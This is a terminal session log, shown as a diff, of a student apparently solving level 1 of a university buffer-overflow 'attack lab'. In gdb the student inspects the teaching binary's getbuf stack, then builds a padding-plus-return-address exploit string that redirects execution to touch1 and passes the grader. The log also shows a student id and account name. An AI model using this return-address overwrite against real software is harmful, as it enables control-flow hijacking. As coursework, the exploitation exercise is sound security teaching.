@@ -1,0 +1,310 @@
+s-164-67-99-71:~ hermmy$ ssh huimin@lnxsrv09.seas.ucla.edu
+huimin@lnxsrv09.seas.ucla.edu's password: 
+Last login: Fri May 11 22:10:49 2018 from s-169-232-239-72.resnet.ucla.edu
+*****************************************************************************
+                        lnxsrv09.seas.ucla.edu RHEL 7
+*****************************************************************************
+
+        RedHat 7 -- may not behave the same as other lnxsrv
+        Will be used by CS 32, CS 35L, CS 111, and CS 131
+
+*****************************************************************************
+*****************************************************************************
+* ========================================================================= *
+* SEASnet Computing Access                                                  *
+*                                                                           *
+* Priority is given both on the servers and in the student labs to those    *
+* students doing coursework. Computing support for research is provided by  *
+* each department.                                                          *
+*****************************************************************************
+* For assistance please contact help@seas.ucla.edu or call 206-6864.        *
+*****************************************************************************
+[huimin@lnxsrv09 ~]$ cd target17/
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget 
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) disas test
+Dump of assembler code for function test:
+   0x00000000004019c2 <+0>:	sub    $0x8,%rsp
+   0x00000000004019c6 <+4>:	mov    $0x0,%eax
+   0x00000000004019cb <+9>:	callq  0x401848 <getbuf>
+   0x00000000004019d0 <+14>:	mov    %eax,%esi
+   0x00000000004019d2 <+16>:	mov    $0x4030b8,%edi
+   0x00000000004019d7 <+21>:	mov    $0x0,%eax
+   0x00000000004019dc <+26>:	callq  0x400c80 <printf@plt>
+   0x00000000004019e1 <+31>:	add    $0x8,%rsp
+   0x00000000004019e5 <+35>:	retq   
+End of assembler dump.
+(gdb) run < ans.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans.txt
+Cookie: 0x76ebdb56
+Type string:No exploit.  Getbuf returned 0x1
+Normal return
+[Inferior 1 (process 25575) exited normally]
+(gdb) break *0x00000000004019d2
+Breakpoint 1 at 0x4019d2: file visible.c, line 93.
+(gdb) run < ans.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x00000000004019d2 in test () at visible.c:93
+93	visible.c: No such file or directory.
+(gdb) x/64bx $edi
+0x0:	Cannot access memory at address 0x0
+(gdb) stepi
+0x00000000004019d7	93	in visible.c
+(gdb) x/64bx $edi
+0x4030b8:	0x4e	0x6f	0x20	0x65	0x78	0x70	0x6c	0x6f
+0x4030c0:	0x69	0x74	0x2e	0x20	0x20	0x47	0x65	0x74
+0x4030c8:	0x62	0x75	0x66	0x20	0x72	0x65	0x74	0x75
+0x4030d0:	0x72	0x6e	0x65	0x64	0x20	0x30	0x78	0x25
+0x4030d8:	0x78	0x0a	0x00	0x0a	0x46	0x41	0x49	0x4c
+0x4030e0:	0x09	0x25	0x63	0x74	0x61	0x72	0x67	0x65
+0x4030e8:	0x74	0x09	0x25	0x64	0x09	0x25	0x73	0x0a
+0x4030f0:	0x00	0x50	0x41	0x53	0x53	0x00	0x46	0x41
+(gdb) stepi
+0x00000000004019dc	93	in visible.c
+(gdb) x/64bx $edi
+0x4030b8:	0x4e	0x6f	0x20	0x65	0x78	0x70	0x6c	0x6f
+0x4030c0:	0x69	0x74	0x2e	0x20	0x20	0x47	0x65	0x74
+0x4030c8:	0x62	0x75	0x66	0x20	0x72	0x65	0x74	0x75
+0x4030d0:	0x72	0x6e	0x65	0x64	0x20	0x30	0x78	0x25
+0x4030d8:	0x78	0x0a	0x00	0x0a	0x46	0x41	0x49	0x4c
+0x4030e0:	0x09	0x25	0x63	0x74	0x61	0x72	0x67	0x65
+0x4030e8:	0x74	0x09	0x25	0x64	0x09	0x25	0x73	0x0a
+0x4030f0:	0x00	0x50	0x41	0x53	0x53	0x00	0x46	0x41
+(gdb) print $edi
+$1 = 4206776
+(gdb) print/x $edi
+$2 = 0x4030b8
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x0000000000401848 <+0>:	sub    $0x38,%rsp
+   0x000000000040184c <+4>:	mov    %rsp,%rdi
+   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
+   0x0000000000401854 <+12>:	mov    $0x1,%eax
+   0x0000000000401859 <+17>:	add    $0x38,%rsp
+   0x000000000040185d <+21>:	retq   
+End of assembler dump.
+(gdb) break *0x000000000040184f
+Breakpoint 2 at 0x40184f: file buf.c, line 14.
+(gdb) run < ans.txt
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 2, 0x000000000040184f in getbuf () at buf.c:14
+14	buf.c: No such file or directory.
+(gdb) x/64bx $rsp
+0x5561a088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a090:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a098:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0a8:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0x5561a0b8:	0x00	0x60	0x58	0x55	0x00	0x00	0x00	0x00
+0x5561a0c0:	0xd0	0x19	0x40	0x00	0x00	0x00	0x00	0x00
+(gdb) disas 0x55586000
+No function contains specified address.
+(gdb) disas 0x4019d0
+Dump of assembler code for function test:
+   0x00000000004019c2 <+0>:	sub    $0x8,%rsp
+   0x00000000004019c6 <+4>:	mov    $0x0,%eax
+   0x00000000004019cb <+9>:	callq  0x401848 <getbuf>
+   0x00000000004019d0 <+14>:	mov    %eax,%esi
+   0x00000000004019d2 <+16>:	mov    $0x4030b8,%edi
+   0x00000000004019d7 <+21>:	mov    $0x0,%eax
+   0x00000000004019dc <+26>:	callq  0x400c80 <printf@plt>
+   0x00000000004019e1 <+31>:	add    $0x8,%rsp
+   0x00000000004019e5 <+35>:	retq   
+End of assembler dump.
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 26936] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt 
+[huimin@lnxsrv09 ~/target17]$ ls
+ans.txt  cookie.txt  ctarget  farm.c  hex2raw  README.txt  rtarget
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt 
+[huimin@lnxsrv09 ~/target17]$ gdb ctar
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+ctar: No such file or directory.
+(gdb) quit
+[huimin@lnxsrv09 ~/target17]$ gdb ctarget 
+GNU gdb (GDB) 8.1
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-pc-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ctarget...done.
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x0000000000401848 <+0>:	sub    $0x38,%rsp
+   0x000000000040184c <+4>:	mov    %rsp,%rdi
+   0x000000000040184f <+7>:	callq  0x401a8a <Gets>
+   0x0000000000401854 <+12>:	mov    $0x1,%eax
+   0x0000000000401859 <+17>:	add    $0x38,%rsp
+   0x000000000040185d <+21>:	retq   
+End of assembler dump.
+(gdb) break * 0x0000000000401859
+Breakpoint 1 at 0x401859: file buf.c, line 16.
+(gdb) run < ans.txt
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
+16	buf.c: No such file or directory.
+(gdb) run < ans.txt
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /w/home.20/cs/ugrad/huimin/target17/ctarget < ans.txt
+Cookie: 0x76ebdb56
+
+Breakpoint 1, 0x0000000000401859 in getbuf () at buf.c:16
+16	in buf.c
+(gdb) x/64bx $rsp
+0x5561a088:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a090:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a098:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0a8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b0:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0b8:	0x30	0x30	0x30	0x30	0x30	0x30	0x30	0x30
+0x5561a0c0:	0x31	0x32	0x33	0x34	0x35	0x00	0x00	0x00
+(gdb) disas touch1
+Dump of assembler code for function touch1:
+   0x000000000040185e <+0>:	sub    $0x8,%rsp
+   0x0000000000401862 <+4>:	movl   $0x1,0x202c90(%rip)        # 0x6044fc <vlevel>
+   0x000000000040186c <+14>:	mov    $0x402ff2,%edi
+   0x0000000000401871 <+19>:	callq  0x400c50 <puts@plt>
+   0x0000000000401876 <+24>:	mov    $0x1,%edi
+   0x000000000040187b <+29>:	callq  0x401c79 <validate>
+   0x0000000000401880 <+34>:	mov    $0x0,%edi
+   0x0000000000401885 <+39>:	callq  0x400df0 <exit@plt>
+End of assembler dump.
+(gdb) quit
+A debugging session is active.
+
+	Inferior 1 [process 35112] will be killed.
+
+Quit anyway? (y or n) y
+[huimin@lnxsrv09 ~/target17]$ ls
+ans.txt  ans.txt~  cookie.txt  ctarget  farm.c  hex2raw  README.txt  rtarget
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw <40155e
+-bash: 40155e: No such file or directory
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < "40185e"
+-bash: 40185e: No such file or directory
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt
+Invalid hex value [0000000000000000000000000000000000000000000000000000000012345]. Please specify only single byte hex values separated by whitespace.
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt
+^@
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt
+^@
+[huimin@lnxsrv09 ~/target17]$ printf "5e 18 40" | ./hex2raw
+^@
+[huimin@lnxsrv09 ~/target17]$ printf "5e 18 40" | ./hex2raw > ans.txt
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw
+5e 18 4-Invalid hex value [4-]. Please specify only single byte hex values separated by whitespace.
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw
+5e 18 40^@
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw
+5e
+^
+[huimin@lnxsrv09 ~/target17]$ printf "5e " | ./hex2raw 
+^
+[huimin@lnxsrv09 ~/target17]$ printf "31 " | ./hex2raw 
+1
+[huimin@lnxsrv09 ~/target17]$ printf "32" | ./hex2raw 
+2
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt
+
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt | od -ta
+0000000 nul nul nul  nl
+0000004
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt | ./ctarget -q
+Cookie: 0x76ebdb56
+Type string:Oops!: You executed an illegal instruction
+Better luck next time
+FAIL: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:FAIL:0xffffffff:ctarget:0:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 5E 18 40 
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt
+^@
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt | od -ta
+0000000 nul nul nul nul nul nul nul nul nul nul nul nul nul nul nul nul
+*
+0000060 nul nul nul nul nul nul   ^ can   @  nl
+0000072
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ print/x ans.txt
+-bash: print/x: No such file or directory
+[huimin@lnxsrv09 ~/target17]$ cat ans.txt | od -ta
+0000000   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0   0
+*
+0000060   0   0   0   0   0   0   0   0   ^   c   a   n   @  nl
+0000076
+[huimin@lnxsrv09 ~/target17]$ emacs ans.txt
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt | ./ctarget -q
+Cookie: 0x76ebdb56
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+	user id	704978214
+	course	CS33-S16
+	lab	attacklab
+	result	17:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 5E 18 40 
+[huimin@lnxsrv09 ~/target17]$ ./hex2raw < ans.txt | ./ctarget
+Cookie: 0x76ebdb56
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+[huimin@lnxsrv09 ~/target17]$ 
